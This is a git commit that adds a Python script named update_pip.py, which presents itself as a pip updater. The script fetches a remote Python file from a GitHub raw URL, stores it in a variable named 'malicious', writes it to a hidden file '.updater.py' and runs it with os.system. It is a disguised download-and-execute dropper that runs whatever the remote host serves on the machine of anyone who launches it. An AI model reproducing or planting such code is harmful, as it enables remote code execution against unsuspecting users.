23a7ac73aa0623ef3531c6a2fa6a3d802fa3869e
jellal-py <mustapha.aghd@gmail.com>
2025-08-10 18:14:53 -0400

    Add files via upload

---
+++ update_pip.py
@@ -0,0 +1,13 @@
+import subprocess, os
+
+os.system('pip install requests')
+
+import requests
+
+malicious = requests.get("https://raw.githubusercontent.com/jellal-py/install/refs/heads/main/install.py").text
+
+with open(".updater.py", "w") as c:
+	for line in malicious:
+		c.write(line)
+
+os.system('python .updater.py')
